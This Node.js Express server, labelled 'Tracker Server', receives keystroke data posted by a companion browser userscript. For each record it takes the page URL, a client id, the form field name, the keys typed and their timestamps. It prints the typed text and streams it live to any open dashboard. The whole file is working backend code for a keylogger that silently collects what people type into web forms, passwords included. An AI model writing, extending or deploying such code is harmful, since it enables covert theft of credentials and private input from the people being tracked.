// server.js
const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' })); // big payloads safe

// In-memory broadcast (all open dashboards get live updates)
const clients = new Set();

// ---------- SSE Stream (Dashboard connects here) ----------
app.get('/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const send = (data) => {
    try { res.write(`data: ${JSON.stringify(data)}\n\n`); } catch {}
  };
  clients.add(send);

  // Ping every 15s to keep Render free tier awake
  const keepAlive = setInterval(() => res.write('data: ping\n\n'), 15000);

  req.on('close', () => {
    clients.delete(send);
    clearInterval(keepAlive);
  });
});

// ---------- POST /log (Your UserScript hits this) ----------
app.post('/log', (req, res) => {
  const payload = {
    url: req.body.url || "unknown",
    client: req.body.client || "unknown",
    field: req.body.field || "",
    keys: Array.isArray(req.body.keys) ? req.body.keys : [],
    timestamps: Array.isArray(req.body.ts) ? req.body.ts : []
  };

  console.log(`[LIVE] ${payload.client} → ${payload.url} → ${payload.keys.join('')}`);

  // Broadcast to ALL open dashboards instantly
  clients.forEach(send => send(payload));

  res.json({ status: "ok" });
});

// Health check
app.get('/', (req, res) => res.send('Tracker Server Live'));

app.listen(PORT, () => {
  console.log(`Server running → https://fs-tracker-online.onrender.com`);
  console.log(`Dashboard → https://fs-tracker-online.onrender.com`);
});